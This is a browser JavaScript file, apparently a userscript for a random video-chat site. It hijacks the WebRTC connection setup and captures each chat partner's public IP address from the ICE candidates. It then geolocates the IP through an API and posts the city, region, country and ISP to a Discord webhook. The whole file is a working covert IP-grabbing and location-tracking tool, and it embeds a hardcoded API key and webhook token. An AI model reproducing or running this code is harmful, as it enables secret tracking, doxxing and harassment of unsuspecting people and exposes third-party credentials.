let apiKey = "2e760390a8384f49a6a54c69b38b50aa";
let webhook = "https://discord.com/api/webhooks/1239376993439715338/U0S1oXYHoa6kdwTopr1sOo2KjOnK1fN16Jy1d478AvO5xoHk7RsXAiI-RLHGWkcSvsJJ"

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    const ip = fields[4];
    if (fields[7] === "srflx") {
        postujdodc(ip);
        pocczekajchwile(1500);
        return;
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let postujdodc = async (ip) => {

  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
  let random = Math.floor(Math.random() * 100)

  var request = new XMLHttpRequest();
  request.open("POST", `${webhook}`);
  // again, replace the url in the open method with yours
  request.setRequestHeader('Content-type', 'application/json');

  await fetch(url).then((response) =>
  response.json().then((json) => {
  
  var myEmbed = {
    author: {
      name: `${random} | Adres IP: ${ip}`,
      icon_url: `${json.country_flag}`
    },
    title: `Miasto: **${json.city}** | Wojewodztwo: **${json.state_prov}**`,
    description: `Kraj: **${json.country_name}** | Dostawca Internetu: **${json.isp}**`,
    color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
  }
  
  var params = {
    username: `ome.bot`,
    embeds: [ myEmbed ],
  }
  
  request.send(JSON.stringify(params));
  
  // function that converts a color HEX to a valid Discord color
  function hexToDecimal(hex) {
    return parseInt(hex.replace("#",""), 16)
  }
}))
}

function pocczekajchwile(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

